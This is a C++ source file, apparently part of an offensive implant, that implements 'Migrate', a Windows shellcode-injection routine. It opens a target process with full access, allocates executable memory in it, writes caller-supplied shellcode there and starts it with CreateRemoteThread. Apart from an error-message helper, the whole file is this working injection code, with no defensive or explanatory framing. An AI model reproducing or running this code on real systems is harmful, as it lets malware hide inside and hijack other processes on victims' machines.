
#include "migrate_remote_thread_windows.h"
#include <iostream>
#include <windows.h>


std::string GetLastErrorAsString()
{
    //Get the error message ID, if any.
    DWORD errorMessageID = ::GetLastError();
    if (errorMessageID == 0) {
        return std::string(); //No error message has been recorded
    }

    LPSTR messageBuffer = nullptr;

    //Ask Win32 to give us the string version of that message ID.
    //The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    //Copy the error message into a std::string.
    std::string message(messageBuffer, size);

    //Free the Win32's string's buffer.
    LocalFree(messageBuffer);

    return message;
}

int Migrate(char* shellcode, int size_shellcode,int pid,char* error)//char* result,char* error)
{

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    int writeRes;

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
    if (processHandle == NULL){
        DWORD dwError = GetLastError();
        sprintf(error, "OpenProcess Error: %ld\n", dwError);
        return 0;
    }

    //processHandle = processInfo.hProcess;
    remoteBuffer = VirtualAllocEx(processHandle, NULL, size_shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        DWORD dwError = GetLastError();
        sprintf(error, "VirtualAllocEx Error: %ld\n", dwError);
        return 0;
    }

    writeRes = WriteProcessMemory(processHandle, remoteBuffer, shellcode, size_shellcode, NULL);
    if (writeRes == 0) {
        DWORD dwError = GetLastError();
        sprintf(error, "WriteProcessMemory Error: %ld\n", dwError);
        return 0;
    }

    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (remoteThread == NULL) {
        DWORD dwError = GetLastError();
        sprintf(error, "CreateRemoteThread Error: %ld\n", dwError);
        return 0;
    }

    /*
    if (CloseHandle(processHandle)) {
        DWORD dwError = GetLastError();
        sprintf(error, "VirtualAllocEx Error: %ld", dwError);
        printf("CloseHandle Error: %ld\n", dwError);
    }
    */

    return 1;
}